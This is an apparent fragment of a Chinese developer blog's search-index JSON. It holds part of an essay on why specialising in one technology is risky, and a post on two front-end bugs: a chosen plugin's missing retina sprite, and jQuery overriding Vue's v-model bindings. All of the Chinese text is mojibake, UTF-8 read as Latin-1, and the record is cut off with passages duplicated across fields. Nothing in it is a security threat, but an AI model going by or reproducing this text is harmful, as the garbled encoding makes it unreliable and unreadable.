å‰é¢é©¬ä¸Šå°±æ˜¯æ­»è·¯äº†ï¼Œä½ åº”è¯¥æ€ä¹ˆåŠï¼Ÿ\næˆ‘ä»¬åº”è¯¥æ€ä¹ˆåŠï¼Ÿ ä¸–ç•Œä¸Šæ²¡æœ‰å®‰å…¨çš„è·¯ï¼Œä¸–ç•Œä¸Šä¹Ÿæ²¡æœ‰ä¸€ç›´å®‰å…¨çš„èŒä¸šã€‚ä¸€ä¸ªèŒä¸šçš„ç«çˆ†ï¼Œå¾€å¾€å› ä¸ºè¿™ä¸ªè¡Œä¸šçš„ç«çˆ†ã€‚è€Œæ°¸è¿œä¹Ÿæ²¡æœ‰æ°¸è¿œç«çˆ†çš„è¡Œä¸šï¼Œå½“é€€æ½®æ—¶ï¼Œå°†ä¼šæœ‰å¤§æ‰¹çš„å¼„æ½®å„¿ä¼šææµ…ï¼Œå¹²æ­»ï¼Œçª’æ¯\u0026hellip;\u0026hellip;\né™¤å»ç¯å¢ƒé€ æˆçš„æ‰°åŠ¨ï¼Œäººçš„èº«ä½“ä¹Ÿä¼šéšç€å¹´é¾„ä¼šæ…¢æ…¢è€åŒ–ã€‚\nä½ å¯ä»¥æƒ³è±¡ä¸€ä¸‹ï¼Œå½“ä½ å››åå¤šå²æ—¶ã€‚é‚£äº›æ–°æ¥çš„å®ä¹ ç”Ÿï¼Œæ¯”ä½ è¦çš„å·¥èµ„ä½ï¼Œæ¯”ä½ æ›´å®¹æ˜“æ¥å—è¿™ä¸ªè¡Œä¸šçš„å‰æ²¿çŸ¥è¯†ï¼Œæ¯”ä½ æ›´åŠ èƒ½åŠ ç­ï¼Œæ¯”ä½ èƒ½åŠ›æ›´å¼ºæ—¶ï¼Œæ¯”ä½ æ›´å¬è¯æ—¶ã€‚ä½ çš„ä¼˜åŠ¿åœ¨å“ªé‡Œï¼Ÿæˆ‘ç›¸ä¿¡åˆ°é‚£æ—¶å€™ï¼Œä½ çš„é¢†å¯¼ä¼šæ¯«ä¸çŠ¹è±«å¼€äº†ä½ ã€‚\nåœ¨æ­¤ï¼Œä½ è¦æ”¹å˜ã€‚æˆ‘ç»™å‡ºä»¥ä¸‹å‡ ä¸ªè§’åº¦ï¼Œä½ å¯ä»¥è‡ªè¡Œå»¶ä¼¸ã€‚\nå¼€å§‹é”»ç‚¼èº«ä½“ è¿™æ˜¯ä¸€åˆ‡çš„åŸºçŸ³ æä¸€æå‰¯ä¸šï¼Œå­¦ä¹ ä¸€ä¸‹ä½ å–œæ¬¢çš„ä¸œè¥¿ï¼Œä½ å¯ä»¥å»æ·±å…¥å­¦å­¦å¦‚ä½•åšèœï¼Œå¦‚ä½•æ‘„å½±ç­‰ç­‰ å­¦ä¹ ç†è´¢çŸ¥è¯†ï¼Œè¿™æ˜¯å­¦æ ¡ä»æ²¡æ•™ä½ çš„ï¼Œä½†æ˜¯å´æ˜¯éå¸¸é‡è¦çš„ä¸œè¥¿ è¯»ä¹¦ï¼Œè¶Šå¤šè¶Šå¥½ å‚è€ƒæ–‡çŒ® ä¸“ä¸šä¸»ä¹‰ æ—¥ å¤§å‰ç ”ä¸€ å¯Œçˆ¸çˆ¸ç©·çˆ¸çˆ¸ ç½—ä¼¯ç‰¹Â·æ¸…å´ / èä¼¦Â·è±å¸Œç‰¹ å›½å¯Œè®º è‹± äºšå½“Â·æ–¯å¯† å¤±æ§ ä¹Œåˆä¹‹ä¼— æ³• å¤æ–¯å¡”å¤«Â·å‹’åº æœªæ¥ä¸–ç•Œçš„å¹¸å­˜è€… é˜®ä¸€å³° æ–°ç”Ÿ ä¸ƒå¹´å°±æ˜¯ä¸€è¾ˆå­ æç¬‘æ¥ ","permalink":"https://wdd.js.org/posts/2019/10/vpqfyr/","summary":"ä»åˆ†å·¥åˆ°ä¸“ä¸šåŒ– åˆ†å·¥æé«˜ç”Ÿäº§æ•ˆç‡ï¼Œä¸“ä¸šåŒ–æé«˜ä¸ªäººä»·å€¼ã€‚å¾ˆå¤šäººéƒ½è®¤ä¸ºï¼Œä¸€æ—¦æˆ‘ä»¬è¿›å…¥äº†æŸä¸€è¡Œï¼Œæˆ‘ä»¬å°±åº”è¯¥åœ¨è¿™ä¸ªè¡Œä¸šæ·±æŒ–åˆ°åº•ã€‚ä¾‹å¦‚æˆ‘æ˜¯åšå‰ç«¯çš„ï¼Œæˆ‘å°±ä¼šå»å­¦ä¹ å„ç§å‰ç«¯çš„çŸ¥è¯†ç‚¹ï¼Œå„ç§å±‚å‡ºä¸ç©·çš„æ¡†æ¶ã€‚æˆ‘æ€»æ˜¯åœ¨å¦‚é¥¥ä¼¼æ¸´çš„å¸Œæœ›è‡ªå·±èƒ½å¤Ÿä¿æŒåœ¨æ·±å…¥å­¦ä¹ çš„çŠ¶æ€ï¼Œæˆ‘ä¸æƒ³å“ªä¸€å¤©è‡ªå·±çªç„¶outäº†ã€‚\nä¸“ä¸šåŒ–çš„å±æœºåœ¨å“ªï¼Ÿ ä»¥å‰æˆ‘åœ¨ä¸Šåˆä¸­çš„æ—¶å€™ï¼Œå°±ç¨ç¨çš„å­¦ä¹ äº†ä¸€ç‚¹ç‚¹ActionScriptçš„çŸ¥è¯†ã€‚å¯èƒ½æœ‰äº›äººä¸çŸ¥é“ActionScriptæ˜¯å¹²å˜›çš„ï¼Œå®ƒæ˜¯åœ¨flashçš„ç¯å¢ƒä¸­å·¥ä½œçš„ï¼Œå¯ä»¥åœ¨flashé‡Œåšä¸€äº›åŠ¨ç”»å’Œç‰¹æ•ˆä¹‹ç±»çš„ã€‚é‚£æ—¶å€™flashæ˜¯å¾ˆç«çš„æŠ€æœ¯ï¼Œå‡ ä¹æ‰€æœ‰çš„ç½‘ç«™éƒ½æ˜¯æœ‰flashçš„ï¼Œæ‰€ä»¥ä¼šActionScriptè¯­è¨€çš„ç¨‹åºå‘˜ï¼Œå·¥èµ„éƒ½ä¸ä½ã€‚\nä½†æ˜¯ï¼Œä½ ç°åœ¨è¿˜å¬è¿‡ä»€ä¹ˆActionScriptå—ï¼Ÿ å®ƒçš„å®¿ä¸»ç¯å¢ƒflashéƒ½å·²ç»è¢«æ·˜æ±°äº†ï¼Œçš®ä¹‹ä¸å­˜æ¯›å°†ç„‰é™„ã€‚å¯æƒ³è€ŒçŸ¥ï¼Œflashçš„æ·˜æ±°ï¼ŒåŒæ—¶ä¹Ÿè®©æ—¶é•¿æ·˜æ±°äº†ä¸€æ‰¹åœ¨ActionScriptçš„ä¸“å®¶ã€‚\næ‰€ä»¥ï¼Œä¸“ä¸šåŒ–å¹¶ä¸æ˜¯ä¸€ä¸ªå®‰å…¨çš„é“è·¯ã€‚å‡†ç¡®æ¥è¯´ï¼Œä¸–ç•Œä¸Šæœ¬æ¥å°±æ²¡æœ‰å®‰å…¨çš„è·¯ã€‚å¤§å¤šè¯´è®¤ä¸ºè¿™æ¡è·¯å®‰å…¨ï¼Œæ˜¯å› ä¸ºä»–ä»¬æ€»æ˜¯ä»¥é™æ€çš„çœ¼å…‰çœ‹è¿™æ¡è·¯ã€‚è¯´ç‚¹é¢˜å¤–è¯ï¼Œå¦‚æœä½ ä¹¦è¯»å¤šäº†ï¼Œä½ ä¼šå‘ç°ï¼Œå…¶å®ä¸€ç›´åœ¨ä½ æ€æƒ³é‡Œçš„é‚£äº›è§‚å¿µï¼Œé‚£äº›æ•…äº‹ï¼Œå¾€å¾€éƒ½æ˜¯å¿½æ‚ äººçš„ã€‚ä½ å¯ä»¥çœ‹çœ‹æˆ‘çš„ä¸€ä¸ªä¹¦å•ï¼š2018å¹´æˆ‘çš„é˜…è¯»è®¡åˆ’ã€‚\nä»ä¼ä¸šçš„è§’åº¦è€ƒè™‘ï¼Œæ¯ä¸ªè€æ¿éƒ½æƒ³æ‹›åœ¨æŸä¸€æ–¹é¢ä¸“å®¶ã€‚ä½†æ˜¯ä»ä¸ªäººçš„è§’åº¦è€ƒè™‘ï¼Œå¦‚æœä½ åœ¨ä¸“ä¸šåŒ–çš„é“è·¯é’»ç ”çš„éå¸¸æ·±ï¼Œæˆ–è®¸æœ‰æ—¶å€™ä½ åº”è¯¥æ”¾æ…¢è„šæ­¥ï¼Œæ‰¾ä¸ªé•¿æ¤…ï¼Œåç€æƒ³ä¸€æƒ³ï¼Œå¦‚æœä½ å‰é¢é©¬ä¸Šå°±æ˜¯æ­»è·¯äº†ï¼Œä½ åº”è¯¥æ€ä¹ˆåŠï¼Ÿ\næˆ‘ä»¬åº”è¯¥æ€ä¹ˆåŠï¼Ÿ ä¸–ç•Œä¸Šæ²¡æœ‰å®‰å…¨çš„è·¯ï¼Œä¸–ç•Œä¸Šä¹Ÿæ²¡æœ‰ä¸€ç›´å®‰å…¨çš„èŒä¸šã€‚ä¸€ä¸ªèŒä¸šçš„ç«çˆ†ï¼Œå¾€å¾€å› ä¸ºè¿™ä¸ªè¡Œä¸šçš„ç«çˆ†ã€‚è€Œæ°¸è¿œä¹Ÿæ²¡æœ‰æ°¸è¿œç«çˆ†çš„è¡Œä¸šï¼Œå½“é€€æ½®æ—¶ï¼Œå°†ä¼šæœ‰å¤§æ‰¹çš„å¼„æ½®å„¿ä¼šææµ…ï¼Œå¹²æ­»ï¼Œçª’æ¯\u0026hellip;\u0026hellip;\né™¤å»ç¯å¢ƒé€ æˆçš„æ‰°åŠ¨ï¼Œäººçš„èº«ä½“ä¹Ÿä¼šéšç€å¹´é¾„ä¼šæ…¢æ…¢è€åŒ–ã€‚\nä½ å¯ä»¥æƒ³è±¡ä¸€ä¸‹ï¼Œå½“ä½ å››åå¤šå²æ—¶ã€‚é‚£äº›æ–°æ¥çš„å®ä¹ ç”Ÿï¼Œæ¯”ä½ è¦çš„å·¥èµ„ä½ï¼Œæ¯”ä½ æ›´å®¹æ˜“æ¥å—è¿™ä¸ªè¡Œä¸šçš„å‰æ²¿çŸ¥è¯†ï¼Œæ¯”ä½ æ›´åŠ èƒ½åŠ ç­ï¼Œæ¯”ä½ èƒ½åŠ›æ›´å¼ºæ—¶ï¼Œæ¯”ä½ æ›´å¬è¯æ—¶ã€‚ä½ çš„ä¼˜åŠ¿åœ¨å“ªé‡Œï¼Ÿæˆ‘ç›¸ä¿¡åˆ°é‚£æ—¶å€™ï¼Œä½ çš„é¢†å¯¼ä¼šæ¯«ä¸çŠ¹è±«å¼€äº†ä½ ã€‚\nåœ¨æ­¤ï¼Œä½ è¦æ”¹å˜ã€‚æˆ‘ç»™å‡ºä»¥ä¸‹å‡ ä¸ªè§’åº¦ï¼Œä½ å¯ä»¥è‡ªè¡Œå»¶ä¼¸ã€‚\nå¼€å§‹é”»ç‚¼èº«ä½“ è¿™æ˜¯ä¸€åˆ‡çš„åŸºçŸ³ æä¸€æå‰¯ä¸šï¼Œå­¦ä¹ ä¸€ä¸‹ä½ å–œæ¬¢çš„ä¸œè¥¿ï¼Œä½ å¯ä»¥å»æ·±å…¥å­¦å­¦å¦‚ä½•åšèœï¼Œå¦‚ä½•æ‘„å½±ç­‰ç­‰ å­¦ä¹ ç†è´¢çŸ¥è¯†ï¼Œè¿™æ˜¯å­¦æ ¡ä»æ²¡æ•™ä½ çš„ï¼Œä½†æ˜¯å´æ˜¯éå¸¸é‡è¦çš„ä¸œè¥¿ è¯»ä¹¦ï¼Œè¶Šå¤šè¶Šå¥½ å‚è€ƒæ–‡çŒ® ä¸“ä¸šä¸»ä¹‰ æ—¥ å¤§å‰ç ”ä¸€ å¯Œçˆ¸çˆ¸ç©·çˆ¸çˆ¸ ç½—ä¼¯ç‰¹Â·æ¸…å´ / èä¼¦Â·è±å¸Œç‰¹ å›½å¯Œè®º è‹± äºšå½“Â·æ–¯å¯† å¤±æ§ ä¹Œåˆä¹‹ä¼— æ³• å¤æ–¯å¡”å¤«Â·å‹’åº æœªæ¥ä¸–ç•Œçš„å¹¸å­˜è€… é˜®ä¸€å³° æ–°ç”Ÿ ä¸ƒå¹´å°±æ˜¯ä¸€è¾ˆå­ æç¬‘æ¥ ","title":"ä½ ä¸çŸ¥é“çš„ä¸“ä¸šåŒ–é“è·¯"},{"content":"1. é—®é¢˜1ï¼šchosenæ’ä»¶æ— æ³•æ˜¾ç¤ºå›¾æ ‡ é—®é¢˜ç°è±¡åœ¨æˆ‘æœ¬åœ°è°ƒè¯•çš„æ—¶å€™ï¼Œæˆ‘ä½¿ç”¨äº†ä¸€ä¸ªå¤šé€‰ä¸‹æ‹‰æ¡†çš„æ’ä»¶ï¼Œå°±æ˜¯chosen, ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œè¿™ä¸ªå¤šé€‰æ¡†ä¸Šé¢çš„å›¾æ ‡ä¸è§äº†ã€‚æˆ‘æ‰¾äº†åŠå¤©æ²¡æœ‰æ‰¾åˆ°åŸå› ï¼Œç„¶åæˆ‘æŠŠæˆ‘çš„æœºå™¨çš„å†…ç½‘åœ°å€ç»™æˆ‘åŒäº‹ï¼Œè®©ä»–è®¿é—®æˆ‘æœºå™¨ï¼Œå½“å®ƒè®¿é—®åˆ°è¿™ä¸ªé¡µé¢æ—¶ã€‚ä»–çš„ç”µè„‘ä¸Šå±…ç„¶æ˜¾ç¤ºå‡ºäº†è¿™ä¸ªä¸‹æ‹‰æ¡†çš„å›¾æ ‡ã€‚\nè¿™æ˜¯ä»€ä¹ˆé¬¼ï¼Ÿ, ä¸ºä»€ä¹ˆåŒæ ·çš„ä»£ç ï¼Œåœ¨æˆ‘çš„ç”µè„‘ä¸Šæ˜¾ç¤ºä¸å‡ºå›¾æ ‡ï¼Œä½†æ˜¯åœ¨ä»–çš„ç”µè„‘ä¸Šå¯ä»¥æ˜¾ç¤ºã€‚æœ‰å¥åè¨€è¯´çš„å¥½ï¼šæ²¡æœ‰ä»€ä¹ˆbugæ˜¯ä¸€éè°ƒè¯•è§£å†³ä¸äº†çš„ï¼Œå¦‚æœæœ‰ï¼Œå°±å†ä»”ç»†è°ƒè¯•ä¸€éã€‚äºæ˜¯æˆ‘å°±å†æ¬¡è°ƒè¯•ä¸€éã€‚\næˆ‘å‘ç°äº†ä¸€äº›ç¬¬ä¸€éæ²¡æœ‰æ³¨æ„åˆ°çš„ä¸œè¥¿åª’ä½“æŸ¥è¯¢ï¼Œå°±æ˜¯åœ¨cssé‡Œæœ‰è¿™æ ·çš„è¯­å¥ï¼š\n@media ä»è¿™é‡Œä½œä¸ºåˆ‡å…¥å£ï¼Œæˆ‘å‘ç°ï¼šåª’ä½“æŸ¥è¯¢çš„ç±»ä¼šè¦†ç›–å®ƒåŸç”Ÿçš„ç±»çš„å±æ€§\nç”±äºæˆ‘çš„ç”µè„‘è§†ç½‘è†œå±å¹•ï¼Œåˆ†è¾¨ç‡æ¯”è¾ƒé«˜ï¼Œè§¦å‘äº†åª’ä½“æŸ¥è¯¢ï¼Œè¿™å°±å¯¼è‡´äº†åª’ä½“æŸ¥è¯¢çš„ç±»è¦†ç›–äº†åŸç”Ÿçš„ç±»ã€‚è€Œè¦†ç›–åçš„ç±»ï¼Œä½¿ç”¨äº†chosen-sprite@2x.pngä½œä¸ºå›¾æ ‡çš„èƒŒæ™¯å›¾ç‰‡ã€‚ä½†æ˜¯è¿™ä¸ªå›¾ç‰‡å¹¶æ²¡æœ‰è¢«æ”¾åœ¨è¿™ä¸ªæ’ä»¶çš„ç›®å½•ä¸‹ï¼Œæœ‰çš„åªæœ‰chosen-sprite.pngè¿™ä¸ªå›¾ç‰‡ã€‚åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œéƒ½æ˜¯ç”¨chosen-sprite.pngä½œä¸ºèƒŒæ™¯å›¾ç‰‡çš„ã€‚è¿™å°±è§£é‡Šäº†ï¼šä¸ºä»€ä¹ˆåŒäº‹çš„ç”µè„‘ä¸Šå‡ºç°äº†å›¾æ ‡ï¼Œä½†æ˜¯æˆ‘çš„ç”µè„‘ä¸Šæ²¡æœ‰å‡ºç°è¿™ä¸ªå›¾æ ‡ã€‚\næ€»ç»“: å¦‚æœä½ è¦ä½¿ç”¨ä¸€ä¸ªæ’ä»¶ï¼Œä½ æœ€å¥½æŠŠè¿™ä¸ªæ’ä»¶çš„æ‰€æœ‰æ–‡ä»¶éƒ½æ”¾åœ¨åŒä¸€ä¸ªç›®å½•ä¸‹ã€‚è€Œä¸è¦åªæ”¾ä¸€äº›ä½ è®¤ä¸ºæœ‰ç”¨çš„æ–‡ä»¶ã€‚æœ€åï¼šåª’ä½“æŸ¥è¯¢çš„ç›¸å…³çŸ¥è¯†ä¹Ÿæ˜¯å¿…è¦çš„ã€‚\n2. é—®é¢˜2ï¼šjQuery ä¸ Vueä¹‹é—´çš„æš§æ˜§ jQueryæµæ´¾ä»£è¡¨ç€ç›´æ¥æ“çºµDOMçš„æµæ´¾ï¼ŒVueæµæ´¾ä»£è¡¨ç€æ“çºµæ•°æ®çš„æµæ´¾ã€‚\nå¦‚æœåœ¨é¡¹ç›®é‡Œï¼Œä½ ä½¿ç”¨äº†ä¸€äº›jQueryæ’ä»¶ï¼Œä¹Ÿä½¿ç”¨äº†Vueï¼Œè¿™å°±å¯èƒ½å¯¼è‡´ä¸€äº›é—®é¢˜ã€‚\nä¸¾ä¸ªä¾‹å­ï¼š\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.bootcss.com/vue/2.4.4/vue.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; å§“å \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;userName\u0026#34;\u0026gt; \u0026lt;br/\u0026gt; å¹´é¾„ \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;userAge\u0026#34; v-model=\u0026#34;userAge\u0026#34;\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; new Vue({ el: \u0026#39;#app\u0026#39;, data: { userName: \u0026#39;\u0026#39;, userAge: 12 } }); $(\u0026#39;#userAge\u0026#39;).val(14); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; åœ¨é¡µé¢åˆšæ‰“å¼€æ—¶ï¼šå§“åè¾“å…¥æ¡†æ˜¯ç©ºçš„ï¼Œå¹´é¾„è¾“å…¥æ¡†æ˜¯14ã€‚ä½†æ˜¯ä¸€æ—¦ä½ åœ¨å§“åè¾“å…¥æ¡†è¾“å…¥ä»»ä½•å­—ç¬¦æ—¶ï¼Œå¹´é¾„è¾“å…¥æ¡†çš„å€¼å°±ä¼šå˜æˆ12ã€‚\nå¦‚æœä½ ä»”ç»†çœ‹è¿‡Vueå®˜æ–¹æ–‡æ¡£ï¼Œä½ ä¼šå¾ˆå®¹æ˜“å®šä½é—®é¢˜æ‰€åœ¨ã€‚\nv-model ä¼šå¿½ç•¥æ‰€æœ‰è¡¨å•å…ƒç´ çš„ valueã€checkedã€selected ç‰¹æ€§çš„åˆå§‹å€¼ã€‚å› ä¸ºå®ƒä¼šé€‰æ‹© Vue å®ä¾‹æ•°æ®æ¥ä½œä¸ºå…·ä½“çš„å€¼ã€‚ä½ åº”è¯¥é€šè¿‡ JavaScript åœ¨ç»„ä»¶çš„ data é€‰é¡¹ä¸­å£°æ˜åˆå§‹å€¼ã€‚---Vueå®˜æ–¹æ–‡æ¡£ ä½ å¯ä»¥ç”¨ v-model æŒ‡ä»¤åœ¨è¡¨å•æ§ä»¶å…ƒç´ ä¸Šåˆ›å»ºåŒå‘æ•°æ®ç»‘å®šã€‚å®ƒä¼šæ ¹æ®æ§ä»¶ç±»å‹è‡ªåŠ¨é€‰å–æ­£ç¡®çš„æ–¹æ³•æ¥æ›´æ–°å…ƒç´ ã€‚å°½ç®¡æœ‰äº›ç¥å¥‡ï¼Œä½† v-model æœ¬è´¨ä¸Šä¸è¿‡æ˜¯è¯­æ³•ç³–ï¼Œå®ƒè´Ÿè´£ç›‘å¬ç”¨æˆ·çš„è¾“å…¥äº‹ä»¶ä»¥æ›´æ–°æ•°æ®ï¼Œå¹¶ç‰¹åˆ«å¤„ç†ä¸€äº›æç«¯çš„ä¾‹å­ã€‚\nå½“userAgeè¢«jQueryæ”¹æˆ14æ—¶ï¼ŒVueå®ä¾‹ä¸­çš„userAgeä»»ç„¶æ˜¯12ã€‚å½“ä½ è¾“å…¥userNameæ—¶ï¼ŒVueå‘ç°æ•°æ®æ”¹å˜ï¼Œè§¦å‘è™šæ‹ŸDOMçš„é‡æ–°æ¸²æŸ“ï¼ŒåŒæ—¶ä¹Ÿå°†userAgeæ¸²æŸ“æˆäº†12ã€‚\næ€»ç»“ï¼šå¦‚æœä½ åœ¨Vueé¡¹ç›®ä¸­é€¼ä¸å¾—å·²ä½¿ç”¨jQuery, ä½ è¦çŸ¥é“è¿™ä¼šå¯¼è‡´å“ªäº›å¸¸è§çš„é—®é¢˜ï¼Œä»¥åŠè§£å†³æ€è·¯ã€‚\n3. æœ€å æˆ‘è‹¦è‹¦å¯»æ‰¾è¯¡å¼‚çš„bugåŸå› ï¼Œå…¶å®æ˜¯æˆ‘çš„æ— çŸ¥ã€‚\n","permalink":"https://wdd.js.org/posts/2019/10/qmgxqm/","summary":"1. é—®é¢˜1ï¼šchosenæ’ä»¶æ— æ³•æ˜¾ç¤ºå›¾æ ‡ é—®é¢˜ç°è±¡åœ¨æˆ‘æœ¬åœ°è°ƒè¯•çš„æ—¶å€™ï¼Œæˆ‘ä½¿ç”¨äº†ä¸€ä¸ªå¤šé€‰ä¸‹æ‹‰æ¡†çš„æ’ä»¶ï¼Œå°±æ˜¯chosen, ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œè¿™ä¸ªå¤šé€‰æ¡†ä¸Šé¢çš„å›¾æ ‡ä¸è§äº†ã€‚æˆ‘æ‰¾äº†åŠå¤©æ²¡æœ‰æ‰¾åˆ°åŸå› ï¼Œç„¶åæˆ‘æŠŠæˆ‘çš„æœºå™¨çš„å†…ç½‘åœ°å€ç»™æˆ‘åŒäº‹ï¼Œè®©ä»–è®¿é—®æˆ‘æœºå™¨ï¼Œå½“å®ƒè®¿é—®åˆ°è¿™ä¸ªé¡µé¢æ—¶ã€‚ä»–çš„ç”µè„‘ä¸Šå±…ç„¶æ˜¾ç¤ºå‡ºäº†è¿™ä¸ªä¸‹æ‹‰æ¡†çš„å›¾æ ‡ã€‚\nè¿™æ˜¯ä»€ä¹ˆé¬¼ï¼Ÿ, ä¸ºä»€ä¹ˆåŒæ ·çš„ä»£ç ï¼Œåœ¨æˆ‘çš„ç”µè„‘ä¸Šæ˜¾ç¤ºä¸å‡ºå›¾æ ‡ï¼Œä½†æ˜¯åœ¨ä»–çš„ç”µè„‘ä¸Šå¯ä»¥æ˜¾ç¤ºã€‚æœ‰å¥åè¨€è¯´çš„å¥½ï¼šæ²¡æœ‰ä»€ä¹ˆbugæ˜¯ä¸€éè°ƒè¯•è§£å†³ä¸äº†çš„ï¼Œå¦‚æœæœ‰ï¼Œå°±å†ä»”ç»†è°ƒè¯•ä¸€éã€‚äºæ˜¯æˆ‘å°±å†æ¬¡è°ƒè¯•ä¸€éã€‚\næˆ‘å‘ç°äº†ä¸€äº›ç¬¬ä¸€éæ²¡æœ‰æ³¨æ„åˆ°çš„ä¸œè¥¿åª’ä½“æŸ¥è¯¢ï¼Œå°±æ˜¯åœ¨cssé‡Œæœ‰è¿™æ ·çš„è¯­å¥ï¼š\n@media ä»è¿™é‡Œä½œä¸ºåˆ‡å…¥å£ï¼Œæˆ‘å‘ç°ï¼šåª’ä½“æŸ¥è¯¢çš„ç±»ä¼šè¦†ç›–å®ƒåŸç”Ÿçš„ç±»çš„å±æ€§\nç”±äºæˆ‘çš„ç”µè„‘è§†ç½‘è†œå±å¹•ï¼Œåˆ†è¾¨ç‡æ¯”è¾ƒé«˜ï¼Œè§¦å‘äº†åª’ä½“æŸ¥è¯¢ï¼Œè¿™å°±å¯¼è‡´äº†åª’ä½“æŸ¥è¯¢çš„ç±»è¦†ç›–äº†åŸç”Ÿçš„ç±»ã€‚è€Œè¦†ç›–åçš„ç±»ï¼Œä½¿ç”¨äº†chosen-sprite@2x.pngä½œä¸ºå›¾æ ‡çš„èƒŒæ™¯å›¾ç‰‡ã€‚ä½†æ˜¯è¿™ä¸ªå›¾ç‰‡å¹¶æ²¡æœ‰è¢«æ”¾åœ¨è¿™ä¸ªæ’ä»¶çš„ç›®å½•ä¸‹ï¼Œæœ‰çš„åªæœ‰chosen-sprite.pngè¿™ä¸ªå›¾ç‰‡ã€‚åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œéƒ½æ˜¯ç”¨chosen-sprite.pngä½œä¸ºèƒŒæ™¯å›¾ç‰‡çš„ã€‚è¿™å°±è§£é‡Šäº†ï¼šä¸ºä»€ä¹ˆåŒäº‹çš„ç”µè„‘ä¸Šå‡ºç°äº†å›¾æ ‡ï¼Œä½†æ˜¯æˆ‘çš„ç”µè„‘ä¸Šæ²¡æœ‰å‡ºç°è¿™ä¸ªå›¾æ ‡ã€‚\næ€»ç»“: å¦‚æœä½ è¦ä½¿ç”¨ä¸€ä¸ªæ’ä»¶ï¼Œä½ æœ€å¥½æŠŠè¿™ä¸ªæ’ä»¶çš„æ‰€æœ‰æ–‡ä»¶éƒ½æ”¾åœ¨åŒä¸€ä¸ªç›®å½•ä¸‹ã€‚è€Œä¸è¦åªæ”¾ä¸€äº›ä½ è®¤ä¸ºæœ‰ç”¨çš„æ–‡ä»¶ã€‚æœ€åï¼šåª’ä½“æŸ¥è¯¢çš„ç›¸å…³çŸ¥è¯†ä¹Ÿæ˜¯å¿…è¦çš„ã€‚\n2. é—®é¢˜2ï¼šjQuery ä¸ Vueä¹‹é—´çš„æš§æ˜§ jQueryæµæ´¾ä»£è¡¨ç€ç›´æ¥æ“çºµDOMçš„æµæ´¾ï¼ŒVueæµæ´¾ä»£è¡¨ç€æ“çºµæ•°æ®çš„æµæ´¾ã€‚\nå¦‚æœåœ¨é¡¹ç›®é‡Œï¼Œä½ ä½¿ç”¨äº†ä¸€äº›jQueryæ’ä»¶ï¼Œä¹Ÿä½¿ç”¨äº†Vueï¼Œè¿™å°±å¯èƒ½å¯¼è‡´ä¸€äº›é—®é¢˜ã€‚\nä¸¾ä¸ªä¾‹å­ï¼š\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.bootcss.com/vue/2.4.4/vue.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; å§“å \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;userName\u0026#34;\u0026gt; \u0026lt;br/\u0026gt; å¹´é¾„ \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;userAge\u0026#34; v-model=\u0026#34;userAge\u0026#34;\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; new Vue({ el: \u0026#39;#app\u0026#39;, data: { userName: \u0026#39;\u0026#39;, userAge: 12 } }); $(\u0026#39;#userAge\u0026#39;).val(14); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; åœ¨é¡µé¢åˆšæ‰“å¼€æ—¶ï¼šå§“åè¾“å…¥æ¡†æ˜¯ç©ºçš„ï¼Œå¹´é¾„è¾“å…¥æ¡†æ˜¯14ã€‚ä½†æ˜¯ä¸€æ—¦ä½ åœ¨å§“åè¾“å…¥æ¡†è¾“å…¥ä»»ä½•å­—ç¬¦æ—¶ï¼Œå¹´é¾„è¾“å…¥æ¡†çš„å€¼å°±ä¼šå˜æˆ12ã€‚\nå¦‚æœä½ ä»”ç»†çœ‹è¿‡Vueå®˜æ–¹æ–‡æ¡£ï¼Œä½ ä¼šå¾ˆå®¹æ˜“å®šä½é—®é¢˜æ‰€åœ¨ã€‚\nv-model ä¼šå¿½ç•¥æ‰€æœ‰è¡¨å•å…ƒç´ çš„ valueã€checkedã€selected ç‰¹æ€§çš„åˆå§‹å€¼ã€‚å› ä¸ºå®ƒä¼šé€‰æ‹© Vue å®ä¾‹æ•°æ®æ¥ä½œä¸ºå…·ä½“çš„å€¼ã€‚ä½ åº”è¯¥é€šè¿‡ JavaScript åœ¨ç»„ä»¶çš„ data é€‰é¡¹ä¸­å£°æ˜åˆå§‹å€¼ã€‚---Vueå®˜æ–¹æ–‡æ¡£ ä½ å¯ä»¥ç”¨ v-model æŒ‡ä»¤åœ¨è¡¨å•æ§ä»¶å…ƒç´ ä¸Šåˆ›å»ºåŒå‘æ•°æ®ç»‘å®šã€‚å®ƒä¼šæ ¹æ®æ§ä»¶ç±»å‹è‡ªåŠ¨é€‰å–æ­£ç¡®çš„æ–¹æ³•æ¥æ›´æ–°å…ƒç´ ã€‚å°½ç®¡æœ‰äº›ç¥å¥‡ï¼Œä½† v-model 